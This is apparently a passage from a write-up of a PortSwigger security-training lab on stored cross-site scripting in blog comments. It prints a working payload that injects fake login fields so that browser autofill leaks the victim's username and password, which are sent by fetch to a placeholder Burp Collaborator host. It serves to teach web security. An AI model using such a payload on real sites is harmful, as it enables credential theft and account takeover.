This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

The autofill functionality will fire when the attacker injects username and password fields:

```javascript
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

By defining such payload, when the password is auto filled it will be sent to the collaborator:
